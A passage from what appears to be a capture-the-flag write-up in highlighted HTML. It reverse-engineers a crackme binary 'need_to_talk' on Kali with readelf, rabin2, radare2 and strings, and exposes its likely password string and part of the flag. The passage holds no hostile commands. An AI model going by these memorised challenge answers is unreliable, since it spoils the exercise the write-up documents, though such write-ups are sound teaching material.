+</span></span><span style="display:flex;"><span>  0x0010:   Name: GLIBC_2.2.5  Flags: none  Version: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Displaying notes found in: .note.gnu.build-id
+</span></span><span style="display:flex;"><span>  Owner                Data size        Description
+</span></span><span style="display:flex;"><span>  GNU                  0x00000014       NT_GNU_BUILD_ID <span style="color:#f92672">(</span>unique build ID bitstring<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Build ID: adba55165982c79dd348a1b03c32d55e15e95cf6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Displaying notes found in: .note.ABI-tag
+</span></span><span style="display:flex;"><span>  Owner                Data size        Description
+</span></span><span style="display:flex;"><span>  GNU                  0x00000010       NT_GNU_ABI_TAG <span style="color:#f92672">(</span>ABI version tag<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    OS: Linux, ABI: 3.2.0                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rabin2 -z need_to_talk 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Strings<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>nth paddr      vaddr      len size section type  string
+</span></span><span style="display:flex;"><span>―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>   0x00002008 0x00002008 <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">10</span>   .rodata ascii kamishiro
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   0x00002018 0x00002018 <span style="color:#ae81ff">37</span>  <span style="color:#ae81ff">38</span>   .rodata ascii Hey Kaneki finnaly you want to talk <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   0x00002040 0x00002040 <span style="color:#ae81ff">82</span>  <span style="color:#ae81ff">83</span>   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>   0x00002098 0x00002098 <span style="color:#ae81ff">35</span>  <span style="color:#ae81ff">36</span>   .rodata ascii Do you have what I<span style="color:#e6db74">&#39;m looking for?\n\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I don&#39;</span>t think this is what I was looking <span style="color:#66d9ef">for</span>.<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>   0x00002128 0x00002128 <span style="color:#ae81ff">36</span>  <span style="color:#ae81ff">37</span>   .rodata ascii Take a look inside of me. rabin2 -z<span style="color:#ae81ff">\n</span>
+</span></span></code></pre></div><h2 id="analyze-elf">Analyze ELF<a href="#analyze-elf" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see the header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ readelf -S  need_to_talk
+</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">30</span> section headers, starting at offset 0x3cd0:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Section Headers:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>Nr<span style="color:#f92672">]</span> Name              Type             Address           Offset
+</span></span><span style="display:flex;"><span>       Size              EntSize          Flags  Link  Info  Align
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 0<span style="color:#f92672">]</span>                   NULL             <span style="color:#ae81ff">0000000000000000</span>  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000000</span>  <span style="color:#ae81ff">0000000000000000</span>           <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 1<span style="color:#f92672">]</span> .interp           PROGBITS         00000000000002a8  000002a8
+</span></span><span style="display:flex;"><span>       000000000000001c  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 2<span style="color:#f92672">]</span> .note.gnu.bu<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span> NOTE             00000000000002c4  000002c4
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000024</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 3<span style="color:#f92672">]</span> .note.ABI-tag     NOTE             00000000000002e8  000002e8
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000020</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 4<span style="color:#f92672">]</span> .gnu.hash         GNU_HASH         <span style="color:#ae81ff">0000000000000308</span>  <span style="color:#ae81ff">00000308</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000030</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">5</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 5<span style="color:#f92672">]</span> .dynsym           DYNSYM           <span style="color:#ae81ff">0000000000000338</span>  <span style="color:#ae81ff">00000338</span>
+</span></span><span style="display:flex;"><span>       00000000000001c8  <span style="color:#ae81ff">0000000000000018</span>   A       <span style="color:#ae81ff">6</span>     <span style="color:#ae81ff">1</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 6<span style="color:#f92672">]</span> .dynstr           STRTAB           <span style="color:#ae81ff">0000000000000500</span>  <span style="color:#ae81ff">00000500</span>
+</span></span><span style="display:flex;"><span>       00000000000000cc  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 7<span style="color:#f92672">]</span> .gnu.version      VERSYM           00000000000005cc  000005cc
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000026</span>  <span style="color:#ae81ff">0000000000000002</span>   A       <span style="color:#ae81ff">5</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 8<span style="color:#f92672">]</span> .gnu.version_r    VERNEED          00000000000005f8  000005f8
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000020</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">6</span>     <span style="color:#ae81ff">1</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span> 9<span style="color:#f92672">]</span> .rela.dyn         RELA             <span style="color:#ae81ff">0000000000000618</span>  <span style="color:#ae81ff">00000618</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000150</span>  <span style="color:#ae81ff">0000000000000018</span>   A       <span style="color:#ae81ff">5</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>10<span style="color:#f92672">]</span> .rela.plt         RELA             <span style="color:#ae81ff">0000000000000768</span>  <span style="color:#ae81ff">00000768</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000108</span>  <span style="color:#ae81ff">0000000000000018</span>  AI       <span style="color:#ae81ff">5</span>    <span style="color:#ae81ff">23</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>11<span style="color:#f92672">]</span> .init             PROGBITS         <span style="color:#ae81ff">0000000000001000</span>  <span style="color:#ae81ff">00001000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000017</span>  <span style="color:#ae81ff">0000000000000000</span>  AX       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>12<span style="color:#f92672">]</span> .plt              PROGBITS         <span style="color:#ae81ff">0000000000001020</span>  <span style="color:#ae81ff">00001020</span>
+</span></span><span style="display:flex;"><span>       00000000000000c0  <span style="color:#ae81ff">0000000000000010</span>  AX       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>13<span style="color:#f92672">]</span> .plt.got          PROGBITS         00000000000010e0  000010e0
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000008</span>  <span style="color:#ae81ff">0000000000000008</span>  AX       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>14<span style="color:#f92672">]</span> .text             PROGBITS         00000000000010f0  000010f0
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000331</span>  <span style="color:#ae81ff">0000000000000000</span>  AX       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>15<span style="color:#f92672">]</span> .fini             PROGBITS         <span style="color:#ae81ff">0000000000001424</span>  <span style="color:#ae81ff">00001424</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000009</span>  <span style="color:#ae81ff">0000000000000000</span>  AX       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>16<span style="color:#f92672">]</span> .rodata           PROGBITS         <span style="color:#ae81ff">0000000000002000</span>  <span style="color:#ae81ff">00002000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000150</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>17<span style="color:#f92672">]</span> .eh_frame_hdr     PROGBITS         <span style="color:#ae81ff">0000000000002150</span>  <span style="color:#ae81ff">00002150</span>
+</span></span><span style="display:flex;"><span>       000000000000005c  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>18<span style="color:#f92672">]</span> .eh_frame         PROGBITS         00000000000021b0  000021b0
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000188</span>  <span style="color:#ae81ff">0000000000000000</span>   A       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>19<span style="color:#f92672">]</span> .init_array       INIT_ARRAY       0000000000003de8  00002de8
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000008</span>  <span style="color:#ae81ff">0000000000000008</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>20<span style="color:#f92672">]</span> .fini_array       FINI_ARRAY       0000000000003df0  00002df0
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000008</span>  <span style="color:#ae81ff">0000000000000008</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>21<span style="color:#f92672">]</span> .dynamic          DYNAMIC          0000000000003df8  00002df8
+</span></span><span style="display:flex;"><span>       00000000000001e0  <span style="color:#ae81ff">0000000000000010</span>  WA       <span style="color:#ae81ff">6</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>22<span style="color:#f92672">]</span> .got              PROGBITS         0000000000003fd8  00002fd8
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000028</span>  <span style="color:#ae81ff">0000000000000008</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>23<span style="color:#f92672">]</span> .got.plt          PROGBITS         <span style="color:#ae81ff">0000000000004000</span>  <span style="color:#ae81ff">00003000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000070</span>  <span style="color:#ae81ff">0000000000000008</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>24<span style="color:#f92672">]</span> .data             PROGBITS         <span style="color:#ae81ff">0000000000004070</span>  <span style="color:#ae81ff">00003070</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000038</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>25<span style="color:#f92672">]</span> .bss              NOBITS           00000000000040b0  000030a8
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000020</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>26<span style="color:#f92672">]</span> .comment          PROGBITS         <span style="color:#ae81ff">0000000000000000</span>  000030a8
+</span></span><span style="display:flex;"><span>       000000000000001d  <span style="color:#ae81ff">0000000000000001</span>  MS       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>27<span style="color:#f92672">]</span> .symtab           SYMTAB           <span style="color:#ae81ff">0000000000000000</span>  000030c8
+</span></span><span style="display:flex;"><span>       00000000000007c8  <span style="color:#ae81ff">0000000000000018</span>          <span style="color:#ae81ff">28</span>    <span style="color:#ae81ff">45</span>     <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>28<span style="color:#f92672">]</span> .strtab           STRTAB           <span style="color:#ae81ff">0000000000000000</span>  <span style="color:#ae81ff">00003890</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000334</span>  <span style="color:#ae81ff">0000000000000000</span>           <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>29<span style="color:#f92672">]</span> .shstrtab         STRTAB           <span style="color:#ae81ff">0000000000000000</span>  00003bc4
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000107</span>  <span style="color:#ae81ff">0000000000000000</span>           <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Key to Flags:
+</span></span><span style="display:flex;"><span>  W <span style="color:#f92672">(</span>write<span style="color:#f92672">)</span>, A <span style="color:#f92672">(</span>alloc<span style="color:#f92672">)</span>, X <span style="color:#f92672">(</span>execute<span style="color:#f92672">)</span>, M <span style="color:#f92672">(</span>merge<span style="color:#f92672">)</span>, S <span style="color:#f92672">(</span>strings<span style="color:#f92672">)</span>, I <span style="color:#f92672">(</span>info<span style="color:#f92672">)</span>,
+</span></span><span style="display:flex;"><span>  L <span style="color:#f92672">(</span>link order<span style="color:#f92672">)</span>, O <span style="color:#f92672">(</span>extra OS processing required<span style="color:#f92672">)</span>, G <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span>, T <span style="color:#f92672">(</span>TLS<span style="color:#f92672">)</span>,
+</span></span><span style="display:flex;"><span>  C <span style="color:#f92672">(</span>compressed<span style="color:#f92672">)</span>, x <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>, o <span style="color:#f92672">(</span>OS specific<span style="color:#f92672">)</span>, E <span style="color:#f92672">(</span>exclude<span style="color:#f92672">)</span>,
+</span></span><span style="display:flex;"><span>  D <span style="color:#f92672">(</span>mbind<span style="color:#f92672">)</span>, l <span style="color:#f92672">(</span>large<span style="color:#f92672">)</span>, p <span style="color:#f92672">(</span>processor specific<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I analyze the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chmod a<span style="color:#f92672">=</span>+x+r+w  need_to_talk 
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ radare2 -d need_to_talk
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f683d0c79c0<span style="color:#f92672">]</span>&gt; aa
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f683d0c79c0<span style="color:#f92672">]</span>&gt; afl
+</span></span><span style="display:flex;"><span>0x55723176f0f0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">43</span>           entry0
+</span></span><span style="display:flex;"><span>0x557231771fe0    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4121</span> -&gt; <span style="color:#ae81ff">4132</span> reloc.__libc_start_main
+</span></span><span style="display:flex;"><span>0x55723176f120    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">41</span>   -&gt; <span style="color:#ae81ff">34</span>   sym.deregister_tm_clones
+</span></span><span style="display:flex;"><span>0x55723176f150    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">57</span>   -&gt; <span style="color:#ae81ff">51</span>   sym.register_tm_clones
+</span></span><span style="display:flex;"><span>0x55723176f190    <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">57</span>   -&gt; <span style="color:#ae81ff">50</span>   sym.__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>0x55723176f0e0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.__cxa_finalize
+</span></span><span style="display:flex;"><span>0x55723176f1d0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">5</span>            entry.init0
+</span></span><span style="display:flex;"><span>0x55723176f000    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">23</span>           sym._init
+</span></span><span style="display:flex;"><span>0x55723176f420    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>            sym.__libc_csu_fini
+</span></span><span style="display:flex;"><span>0x55723176f22d    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">101</span>          sym.print_intro
+</span></span><span style="display:flex;"><span>0x55723176f424    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">9</span>            sym._fini
+</span></span><span style="display:flex;"><span>0x55723176f292    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">87</span>           sym.slow_type
+</span></span><span style="display:flex;"><span>0x55723176f3c0    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">93</span>           sym.__libc_csu_init
+</span></span><span style="display:flex;"><span>0x55723176f1d5    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">88</span>           main
+</span></span><span style="display:flex;"><span>0x55723176f2e9    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">125</span>          sym.check_password
+</span></span><span style="display:flex;"><span>0x55723176f366    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">77</span>           sym.print_flag
+</span></span><span style="display:flex;"><span>0x55723176f0b0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.malloc
+</span></span><span style="display:flex;"><span>0x55723176f050    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.puts
+</span></span><span style="display:flex;"><span>0x55723176f030    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.free
+</span></span><span style="display:flex;"><span>0x55723176f040    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.putchar
+</span></span><span style="display:flex;"><span>0x55723176f060    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.strlen
+</span></span><span style="display:flex;"><span>0x55723176f070    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.setbuf
+</span></span><span style="display:flex;"><span>0x55723176f080    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.printf
+</span></span><span style="display:flex;"><span>0x55723176e000    <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">348</span>  -&gt; <span style="color:#ae81ff">403</span>  loc.imp._ITM_deregisterTMCloneTable
+</span></span><span style="display:flex;"><span>0x55723176f090    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.fgets
+</span></span><span style="display:flex;"><span>0x55723176f0a0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.strcmp
+</span></span><span style="display:flex;"><span>0x55723176f0c0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.sleep
+</span></span><span style="display:flex;"><span>0x55723176f0d0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.usleep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f683d0c79c0<span style="color:#f92672">]</span>&gt; pdf@main
+</span></span><span style="display:flex;"><span>            ; DATA XREF from entry0 @ 0x55723176f10d
+</span></span><span style="display:flex;"><span>┌ 88: int main <span style="color:#f92672">(</span>int argc, char **argv, char **envp<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>│           0x55723176f1d5      <span style="color:#ae81ff">55</span>             push rbp
+</span></span><span style="display:flex;"><span>│           0x55723176f1d6      4889e5         mov rbp, rsp
+</span></span><span style="display:flex;"><span>│           0x55723176f1d9      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>│           0x55723176f1de      e84a000000     call sym.print_intro
+</span></span><span style="display:flex;"><span>│           0x55723176f1e3      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>│           0x55723176f1e8      e8fc000000     call sym.check_password
+</span></span><span style="display:flex;"><span>│           0x55723176f1ed      85c0           test eax, eax
+</span></span><span style="display:flex;"><span>│       ┌─&lt; 0x55723176f1ef      741d           je 0x55723176f20e
+</span></span><span style="display:flex;"><span>│       │   0x55723176f1f1      488d3dc80e00.  lea rdi, str.Good_job._I_believe_this_is_what_you_came_for:_n ; 0x5572317700c0 ; <span style="color:#e6db74">&#34;Good job. I believe this is what you came for:\n&#34;</span>
+</span></span><span style="display:flex;"><span>│       │   0x55723176f1f8      e895000000     call sym.slow_type
+</span></span><span style="display:flex;"><span>│       │   0x55723176f1fd      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>│       │   0x55723176f202      e85f010000     call sym.print_flag
+</span></span><span style="display:flex;"><span>│       │   0x55723176f207      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>│      ┌──&lt; 0x55723176f20c      eb1d           jmp 0x55723176f22b
+</span></span><span style="display:flex;"><span>│      │└─&gt; 0x55723176f20e      488d3ddb0e00.  lea rdi, str.Hmm._I_dont_think_this_is_what_I_was_looking_for._n ; 0x5572317700f0 ; <span style="color:#e6db74">&#34;Hmm. I don&#39;t think this is what I was looking for.\n&#34;</span>
+</span></span><span style="display:flex;"><span>│      │    0x55723176f215      e878000000     call sym.slow_type
+</span></span><span style="display:flex;"><span>│      │    0x55723176f21a      488d3d070f00.  lea rdi, str.Take_a_look_inside_of_me._rabin2__z_n ; 0x557231770128 ; <span style="color:#e6db74">&#34;Take a look inside of me. rabin2 -z\n&#34;</span>
+</span></span><span style="display:flex;"><span>│      │    0x55723176f221      e86c000000     call sym.slow_type
+</span></span><span style="display:flex;"><span>│      │    0x55723176f226      b801000000     mov eax, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>│      │    ; CODE XREF from main @ 0x55723176f20c
+</span></span><span style="display:flex;"><span>│      └──&gt; 0x55723176f22b      5d             pop rbp
+</span></span><span style="display:flex;"><span>└           0x55723176f22c      c3             ret
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f683d0c79c0<span style="color:#f92672">]</span>&gt; 
+</span></span></code></pre></div><p>I execute the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./need_to_talk
+</span></span><span style="display:flex;"><span>Hey Kaneki finnaly you want to talk 
+</span></span><span style="display:flex;"><span>Unfortunately before I can give you the kagune you need to give me the paraphrase
+</span></span><span style="display:flex;"><span>Do you have what I<span style="color:#e6db74">&#39;m looking for?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; Yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hmm. I don&#39;</span>t think this is what I was looking <span style="color:#66d9ef">for</span>.
+</span></span><span style="display:flex;"><span>Take a look inside of me. rabin2 -z
+</span></span></code></pre></div><p>I execute <code>strings</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ strings need_to_talk             
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span>mgUa
+</span></span><span style="display:flex;"><span>puts
+</span></span><span style="display:flex;"><span>putchar
+</span></span><span style="display:flex;"><span>stdin
+</span></span><span style="display:flex;"><span>printf
+</span></span><span style="display:flex;"><span>fgets
+</span></span><span style="display:flex;"><span>strlen
+</span></span><span style="display:flex;"><span>stdout
+</span></span><span style="display:flex;"><span>malloc
+</span></span><span style="display:flex;"><span>usleep
+</span></span><span style="display:flex;"><span>__cxa_finalize
+</span></span><span style="display:flex;"><span>setbuf
+</span></span><span style="display:flex;"><span>strcmp
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>free
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
+</span></span><span style="display:flex;"><span>u/UH
+</span></span><span style="display:flex;"><span>You_founH
+</span></span><span style="display:flex;"><span>d_1t
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[]</span>A<span style="color:#ae81ff">\A</span><span style="color:#f92672">]</span>A^A_
+</span></span><span style="display:flex;"><span>kamishiro    &lt;-- Interesting
+</span></span><span style="display:flex;"><span>Hey Kaneki finnaly you want to talk 
+</span></span><span style="display:flex;"><span>Unfortunately before I can give you the kagune you need to give me the paraphrase
+</span></span><span style="display:flex;"><span>Do you have what I<span style="color:#e6db74">&#39;m looking for?
